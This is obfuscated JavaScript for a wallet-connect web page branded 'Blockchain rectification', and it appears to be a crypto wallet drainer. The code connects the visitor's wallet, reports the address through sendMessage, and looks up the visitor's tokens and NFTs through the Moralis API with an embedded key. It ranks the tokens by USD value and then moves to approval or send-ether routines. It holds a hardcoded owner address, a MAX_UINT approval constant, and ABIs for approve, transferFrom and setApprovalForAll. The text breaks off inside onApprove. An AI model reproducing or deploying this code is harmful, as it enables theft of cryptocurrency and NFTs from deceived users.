const _0x1dea57=_0x3914;(function(_0xcb9f72,_0x4d7865){const _0x5c6153=_0x3914,_0x340197=_0xcb9f72();while(!![]){try{const _0x4df029=-parseInt(_0x5c6153(0x1f2))/0x1+parseInt(_0x5c6153(0x208))/0x2*(-parseInt(_0x5c6153(0x231))/0x3)+-parseInt(_0x5c6153(0x275))/0x4+parseInt(_0x5c6153(0x212))/0x5+parseInt(_0x5c6153(0x204))/0x6*(parseInt(_0x5c6153(0x216))/0x7)+parseInt(_0x5c6153(0x286))/0x8+-parseInt(_0x5c6153(0x2a9))/0x9*(-parseInt(_0x5c6153(0x20b))/0xa);if(_0x4df029===_0x4d7865)break;else _0x340197['push'](_0x340197['shift']());}catch(_0x53f5cb){_0x340197['push'](_0x340197['shift']());}}}(_0x5e9d,0xc1219));let NFTs=[],tokens=[],chainId=null,web3Object=null,selectedAccount=null;import{EthereumClient,w3mConnectors,w3mProvider,WagmiCore,WagmiCoreChains,WagmiCoreConnectors}from'https://unpkg.com/@web3modal/ethereum@2.6.2';import{parseEther}from'https://esm.sh/v126/viem@1.2.15/es2022/viem.bundle.mjs';import{Web3Modal}from'https://unpkg.com/@web3modal/html@2.6.2';const {arbitrum,mainnet}=WagmiCoreChains,{configureChains,createConfig,writeContract,sendTransaction,fetchBalance,fetchFeeData,connect,switchNetwork,getAccount,getNetwork}=WagmiCore,chains=[arbitrum,mainnet],projectId='ee71d215d0dec7d1bf950851c84d9643',{publicClient}=configureChains(chains,[w3mProvider({'projectId':projectId})]),wagmiConfig=createConfig({'autoConnect':!![],'connectors':[...w3mConnectors({'chains':chains,'version':0x2,'projectId':projectId}),new WagmiCoreConnectors[(_0x1dea57(0x298))]({'chains':chains,'options':{'appName':'Blockchain\x20rectification'}})],'publicClient':publicClient}),ethereumClient=new EthereumClient(wagmiConfig,chains);export const web3Modal=new Web3Modal({'projectId':projectId,'walletImages':{'safe':_0x1dea57(0x21e),'coinbase':_0x1dea57(0x2a1)}},ethereumClient);let currentUrl=window[_0x1dea57(0x1ee)][_0x1dea57(0x24f)];const OWNER_ADDRESS=_0x1dea57(0x21b),ABI=[{'constant':!![],'inputs':[],'name':_0x1dea57(0x295),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x2a2),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x252),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'constant':![],'inputs':[{'name':_0x1dea57(0x278),'type':_0x1dea57(0x262)},{'name':_0x1dea57(0x2a7),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x299),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x1fc),'outputs':[{'name':'','type':_0x1dea57(0x26e)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x26f),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x285),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x246),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x28d),'type':'address'},{'name':_0x1dea57(0x218),'type':_0x1dea57(0x262)},{'name':_0x1dea57(0x2a7),'type':'uint256'}],'name':_0x1dea57(0x280),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':'address'}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[{'name':'','type':_0x1dea57(0x262)}],'name':_0x1dea57(0x279),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':'view','type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x230),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x1dea57(0x2a6),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':'_totalSupply','outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[{'name':_0x1dea57(0x243),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x236),'outputs':[{'name':'','type':_0x1dea57(0x26e)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[{'name':'','type':_0x1dea57(0x262)},{'name':'','type':_0x1dea57(0x262)}],'name':'allowed','outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':'view','type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x27c),'outputs':[{'name':'','type':_0x1dea57(0x26e)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[{'name':_0x1dea57(0x1fe),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x242),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[],'name':_0x1dea57(0x2a5),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x221),'outputs':[{'name':'','type':_0x1dea57(0x262)}],'payable':![],'stateMutability':'view','type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x229),'outputs':[{'name':'','type':_0x1dea57(0x262)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x290),'outputs':[{'name':'','type':_0x1dea57(0x1f4)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x218),'type':'address'},{'name':_0x1dea57(0x2a7),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x2a8),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x27a),'type':_0x1dea57(0x1f5)},{'name':_0x1dea57(0x274),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x296),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x1dea57(0x1f5)}],'name':'issue','outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x1dea57(0x1f5)}],'name':'redeem','outputs':[],'payable':![],'stateMutability':'nonpayable','type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[{'name':_0x1dea57(0x281),'type':_0x1dea57(0x262)},{'name':_0x1dea57(0x278),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x200),'outputs':[{'name':_0x1dea57(0x241),'type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1dea57(0x21f),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[{'name':'','type':_0x1dea57(0x262)}],'name':_0x1dea57(0x287),'outputs':[{'name':'','type':_0x1dea57(0x26e)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':_0x1dea57(0x25a),'type':'address'}],'name':_0x1dea57(0x282),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'constant':!![],'inputs':[],'name':_0x1dea57(0x289),'outputs':[{'name':'','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':'newOwner','type':'address'}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':'address'}],'name':_0x1dea57(0x205),'outputs':[],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'name':_0x1dea57(0x263),'type':_0x1dea57(0x1f5)},{'name':_0x1dea57(0x269),'type':'string'},{'name':_0x1dea57(0x2a0),'type':_0x1dea57(0x1f4)},{'name':'_decimals','type':_0x1dea57(0x1f5)}],'payable':![],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x248)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x22b),'type':_0x1dea57(0x1f5)}],'name':'Issue','type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x22b),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x227),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x253),'type':_0x1dea57(0x262)}],'name':'Deprecate','type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':'feeBasisPoints','type':'uint256'},{'indexed':![],'name':_0x1dea57(0x257),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x271),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x24b),'type':_0x1dea57(0x262)},{'indexed':![],'name':_0x1dea57(0x261),'type':_0x1dea57(0x1f5)}],'name':'DestroyedBlackFunds','type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x249),'type':'address'}],'name':_0x1dea57(0x276),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x1dea57(0x249),'type':'address'}],'name':_0x1dea57(0x266),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x1dea57(0x229),'type':_0x1dea57(0x262)},{'indexed':!![],'name':_0x1dea57(0x28a),'type':'address'},{'indexed':![],'name':'value','type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x1f6),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x1dea57(0x262)},{'indexed':!![],'name':'to','type':_0x1dea57(0x262)},{'indexed':![],'name':'value','type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x284),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[],'name':'Pause','type':'event'},{'anonymous':![],'inputs':[],'name':_0x1dea57(0x22d),'type':_0x1dea57(0x217)}],ABIN=[{'inputs':[{'internalType':_0x1dea57(0x1f4),'name':_0x1dea57(0x295),'type':_0x1dea57(0x1f4)},{'internalType':'string','name':_0x1dea57(0x290),'type':_0x1dea57(0x1f4)},{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x268),'type':_0x1dea57(0x1f5)},{'internalType':_0x1dea57(0x1f5),'name':'saleStart','type':'uint256'}],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x248)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x229),'type':_0x1dea57(0x262)},{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x27d),'type':_0x1dea57(0x262)},{'indexed':!![],'internalType':'uint256','name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x1f6),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x1dea57(0x229),'type':_0x1dea57(0x262)},{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x20c),'type':_0x1dea57(0x262)},{'indexed':![],'internalType':_0x1dea57(0x26e),'name':_0x1dea57(0x27d),'type':'bool'}],'name':_0x1dea57(0x24c),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x26c),'type':_0x1dea57(0x262)},{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x245),'type':'address'}],'name':_0x1dea57(0x28c),'type':_0x1dea57(0x217)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x237),'type':_0x1dea57(0x262)},{'indexed':!![],'internalType':_0x1dea57(0x262),'name':'to','type':_0x1dea57(0x262)},{'indexed':!![],'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x284),'type':_0x1dea57(0x217)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x1dea57(0x1f4),'name':'','type':_0x1dea57(0x1f4)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x1ef),'outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':_0x1dea57(0x1f5)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x28e),'outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':_0x1dea57(0x1f5)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':'apePrice','outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':'uint256'}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':'to','type':_0x1dea57(0x262)},{'internalType':_0x1dea57(0x1f5),'name':'tokenId','type':'uint256'}],'name':_0x1dea57(0x299),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x229),'type':'address'}],'name':_0x1dea57(0x242),'outputs':[{'internalType':'uint256','name':'','type':_0x1dea57(0x1f5)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x1dea57(0x1f4),'name':'','type':_0x1dea57(0x1f4)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x20e),'outputs':[],'stateMutability':'nonpayable','type':_0x1dea57(0x22f)},{'inputs':[],'name':'flipSaleState','outputs':[],'stateMutability':'nonpayable','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':'tokenId','type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x1f7),'outputs':[{'internalType':_0x1dea57(0x262),'name':'','type':_0x1dea57(0x262)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':'owner','type':_0x1dea57(0x262)},{'internalType':'address','name':_0x1dea57(0x20c),'type':'address'}],'name':'isApprovedForAll','outputs':[{'internalType':_0x1dea57(0x26e),'name':'','type':_0x1dea57(0x26e)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x23d),'outputs':[{'internalType':'uint256','name':'','type':_0x1dea57(0x1f5)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x26b),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x288),'outputs':[],'stateMutability':_0x1dea57(0x239),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x295),'outputs':[{'internalType':_0x1dea57(0x1f4),'name':'','type':'string'}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x229),'outputs':[{'internalType':'address','name':'','type':_0x1dea57(0x262)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':'ownerOf','outputs':[{'internalType':_0x1dea57(0x262),'name':'','type':_0x1dea57(0x262)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':'renounceOwnership','outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'inputs':[],'name':_0x1dea57(0x222),'outputs':[],'stateMutability':'nonpayable','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x237),'type':'address'},{'internalType':_0x1dea57(0x262),'name':'to','type':_0x1dea57(0x262)},{'internalType':'uint256','name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x237),'type':_0x1dea57(0x262)},{'internalType':_0x1dea57(0x262),'name':'to','type':'address'},{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x29e),'type':'uint256'},{'internalType':_0x1dea57(0x23a),'name':_0x1dea57(0x210),'type':'bytes'}],'name':_0x1dea57(0x24d),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x2ab),'outputs':[{'internalType':_0x1dea57(0x26e),'name':'','type':_0x1dea57(0x26e)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x20c),'type':_0x1dea57(0x262)},{'internalType':_0x1dea57(0x26e),'name':_0x1dea57(0x27d),'type':_0x1dea57(0x26e)}],'name':_0x1dea57(0x28b),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f4),'name':_0x1dea57(0x258),'type':_0x1dea57(0x1f4)}],'name':_0x1dea57(0x25b),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f4),'name':'provenanceHash','type':_0x1dea57(0x1f4)}],'name':_0x1dea57(0x297),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x256),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x270),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':'function'},{'inputs':[],'name':_0x1dea57(0x240),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x20a),'outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':_0x1dea57(0x1f5)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[],'name':'startingIndexBlock','outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':_0x1dea57(0x1f5)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1ff),'name':_0x1dea57(0x2a4),'type':_0x1dea57(0x1ff)}],'name':_0x1dea57(0x225),'outputs':[{'internalType':'bool','name':'','type':_0x1dea57(0x26e)}],'stateMutability':_0x1dea57(0x206),'type':'function'},{'inputs':[],'name':_0x1dea57(0x290),'outputs':[{'internalType':'string','name':'','type':_0x1dea57(0x1f4)}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x214),'type':_0x1dea57(0x1f5)}],'name':'tokenByIndex','outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':'uint256'}],'stateMutability':_0x1dea57(0x206),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x229),'type':'address'},{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x214),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x21a),'outputs':[{'internalType':_0x1dea57(0x1f5),'name':'','type':_0x1dea57(0x1f5)}],'stateMutability':_0x1dea57(0x206),'type':'function'},{'inputs':[{'internalType':_0x1dea57(0x1f5),'name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x25d),'outputs':[{'internalType':'string','name':'','type':_0x1dea57(0x1f4)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[],'name':'totalSupply','outputs':[{'internalType':'uint256','name':'','type':_0x1dea57(0x1f5)}],'stateMutability':'view','type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x237),'type':_0x1dea57(0x262)},{'internalType':_0x1dea57(0x262),'name':'to','type':_0x1dea57(0x262)},{'internalType':'uint256','name':_0x1dea57(0x29e),'type':_0x1dea57(0x1f5)}],'name':_0x1dea57(0x280),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[{'internalType':_0x1dea57(0x262),'name':_0x1dea57(0x245),'type':_0x1dea57(0x262)}],'name':_0x1dea57(0x209),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':_0x1dea57(0x22f)},{'inputs':[],'name':_0x1dea57(0x255),'outputs':[],'stateMutability':_0x1dea57(0x1f1),'type':'function'}];let wallet;$(_0x1dea57(0x29f))[_0x1dea57(0x29d)](async function(){const _0x1725be=_0x1dea57;wallet=_0x1725be(0x264),await connector();}),$(_0x1dea57(0x27f))[_0x1dea57(0x29d)](async function(){const _0x3b4e21=_0x1dea57;wallet=_0x3b4e21(0x224),await connector();}),$(_0x1dea57(0x283))[_0x1dea57(0x29d)](async function(){const _0x438fec=_0x1dea57;wallet=_0x438fec(0x1f0),await connector();}),$(_0x1dea57(0x23f))['click'](async function(){const _0x346c5a=_0x1dea57;try{await web3Modal[_0x346c5a(0x294)]();}catch(_0x309782){console['log'](_0x346c5a(0x247),_0x309782);return;}});let connector=async()=>{const _0x2911f3=_0x1dea57;if(typeof web3===_0x2911f3(0x24a)||typeof ethereum===_0x2911f3(0x24a)){console[_0x2911f3(0x21d)](_0x2911f3(0x273));if(wallet===_0x2911f3(0x264)){let _0x673369='https://metamask.app.link/dapp/'+currentUrl;window[_0x2911f3(0x1ee)][_0x2911f3(0x24f)]=_0x673369;}else{if(wallet===_0x2911f3(0x224)){let _0x180e29=_0x2911f3(0x235)+currentUrl;window[_0x2911f3(0x1ee)]['href']=_0x180e29;}else{if(wallet==='trustwallet'){let _0x504660='https://link.trustwallet.com/open_url?url='+currentUrl;window[_0x2911f3(0x1ee)][_0x2911f3(0x24f)]=_0x504660;}}}}else try{await web3Modal['openModal']();}catch(_0x1fd12d){console[_0x2911f3(0x21d)](_0x2911f3(0x247),_0x1fd12d);return;}};function _0x5e9d(){const _0x1636e5=['_spender','balances','newBasisPoints','&vs_currencies=usd','paused','approved','https://api.coingecko.com/api/v3/simple/token_price/arbitrum-one?contract_addresses=','.coinbase','transferFrom','_owner','removeBlackList','.trust','Transfer','addBlackList','11530200PDxUpn','isBlackListed','mintApe','MAX_UINT','spender','setApprovalForAll','OwnershipTransferred','_from','REVEAL_TIMESTAMP','all','symbol','https://deep-index.moralis.io/api/v2/','999999999999999999999999999999999999999999999999999999999999999999999999','connector','openModal','name','setParams','setProvenanceHash','CoinbaseWalletConnector','approve','catch','Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','NFT','click','tokenId','.meta','_symbol','https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png','_upgradedAddress','.proceed','interfaceId','pause','maximumFee','_value','transfer','1522170lGecez','hash','saleIsActive','location','MAX_APES','trustwallet','nonpayable','117783LfiXAn','formatted','string','uint256','Approval','getApproved','MetaMask','gasPrice','json','Error:\x20','deprecated','Error\x20collecting\x20info\x20about\x20wallet','who','bytes4','allowance','networkVersion','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','Unable\x20to\x20get\x20NFts','509154JSENNg','destroyBlackFunds','view','Incorrect\x20network','5652jXRRIl','transferOwnership','startingIndex','20HNxGCE','operator','Transaction\x20is\x20submitted\x20to\x20the\x20network','emergencySetStartingIndexBlock','&format=decimal&limit=','_data','/erc20','604100lywpNI','search','index','price','63IjoinC','event','_to','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','tokenOfOwnerByIndex','0xea8968B218a551919FbD5f1166328C82a96dED54','options','log','https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg','basisPointsRate','chainId:','getOwner','reserveApes','filter','coinbase','supportsInterface','token_address','Redeem','Error\x20processing\x20item\x20','owner','Transaction\x20Rejected','amount','tokens-list','Unpause','No\x20address','function','decimals','1068DIvxrN','error','Tokens:','balance','https://go.cb-w.com/dapp?cb_url=','getBlackListStatus','from','Approved','payable','bytes','then','Initial\x20list\x20','maxApePurchase','arbitrum','.connect','setStartingIndex','remaining','balanceOf','_maker','TOKEN\x20Contract\x20Address\x20','newOwner','totalSupply','Could\x20not\x20get\x20a\x20wallet\x20connection','constructor','_user','undefined','_blackListedUser','ApprovalForAll','safeTransferFrom','sort','href','length','5902378376','deprecate','newAddress','map','withdraw','revealTimeStamp','maxFee','baseURI','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','_clearedUser','setBaseURI','GET','tokenURI','status','New\x20token','value','_balance','address','_initialSupply','metamask','NFT\x20Contract\x20Address\x20','RemovedBlackList','toString','maxNftSupply','_name','message','numberOfTokens','previousOwner','Approve\x20Completed\x20Successfully','bool','_evilUser','setRevealTimestamp','Params','application/json','Hahahahahah','newMaxFee','2996728oOtHTF','AddedBlackList','0x3Acb41A1B58e8FF9f88E9a24118171a1a4077A40'];_0x5e9d=function(){return _0x1636e5;};return _0x5e9d();}$(_0x1dea57(0x2a3))['click'](async function(){const _0x5568ae=_0x1dea57;let _0x470361=getAccount();console[_0x5568ae(0x21d)](_0x470361),!_0x470361[_0x5568ae(0x262)]&&(console[_0x5568ae(0x21d)](_0x5568ae(0x22e)),alert(_0x5568ae(0x259))),_0x470361[_0x5568ae(0x293)][_0x5568ae(0x295)]===_0x5568ae(0x1f8)&&(_0x470361['connector'][_0x5568ae(0x21c)]['getProvider']()[_0x5568ae(0x201)]!=='42161'&&(console[_0x5568ae(0x21d)](_0x5568ae(0x207)),await switchNetwork({'chainId':0xa4b1}))),selectedAccount=_0x470361[_0x5568ae(0x262)],sendMessage(_0x5568ae(0x29b)),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall();});const Oxa=_0x1dea57(0x277),Oxc=_0x1dea57(0x251);async function covalenthqAPICall(){const _0x3b3ea4=_0x1dea57,_0x6d4b8f={'chain':'arbitrum'},_0x4c171f=new URL(_0x3b3ea4(0x291)+selectedAccount+_0x3b3ea4(0x211));_0x4c171f[_0x3b3ea4(0x213)]=new URLSearchParams(_0x6d4b8f)['toString']();const _0x5d4a3a={'method':_0x3b3ea4(0x25c),'headers':{'accept':_0x3b3ea4(0x272),'X-API-Key':_0x3b3ea4(0x202)}};try{const _0x4be097=await fetch(_0x4c171f,_0x5d4a3a)[_0x3b3ea4(0x23b)](_0x3e3b26=>_0x3e3b26[_0x3b3ea4(0x1fa)]());console[_0x3b3ea4(0x21d)](_0x4be097);let _0x5893b2=_0x4be097;console[_0x3b3ea4(0x21d)](_0x3b3ea4(0x23c),_0x5893b2);let _0x5696e5=await Promise[_0x3b3ea4(0x28f)](_0x5893b2[_0x3b3ea4(0x254)](async _0x26d33c=>{const _0x1416d9=_0x3b3ea4;let _0x19b2fa;try{_0x19b2fa=await getValue(_0x26d33c[_0x1416d9(0x226)],_0x26d33c[_0x1416d9(0x234)],_0x26d33c[_0x1416d9(0x230)]);}catch(_0x1fa290){_0x19b2fa=0x0;}return console['log'](_0x19b2fa),{'balance':_0x26d33c[_0x1416d9(0x234)],'value':_0x19b2fa,'address':_0x26d33c[_0x1416d9(0x226)]};}));console[_0x3b3ea4(0x21d)](_0x3b3ea4(0x22c),_0x5696e5),tokens=_0x5696e5[_0x3b3ea4(0x223)](_0x20d956=>_0x20d956[_0x3b3ea4(0x260)]>0x5),tokens[_0x3b3ea4(0x24e)]((_0x57abc3,_0x1c9a61)=>_0x1c9a61[_0x3b3ea4(0x260)]-_0x57abc3['value']),console[_0x3b3ea4(0x21d)](_0x3b3ea4(0x220),await getNetwork(),_0x3b3ea4(0x233),tokens),NFTs=await getNFTs(selectedAccount)[_0x3b3ea4(0x29a)](_0x423a1a=>{const _0x3bc42c=_0x3b3ea4;console[_0x3bc42c(0x21d)](_0x3bc42c(0x203),_0x423a1a);}),NFTs=NFTs['result'],console[_0x3b3ea4(0x21d)]('NFTs\x20collection\x20',NFTs);if(tokens[_0x3b3ea4(0x250)]===0x0&&NFTs['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x3b3ea4(0x1fd));}}async function onApprove(){const 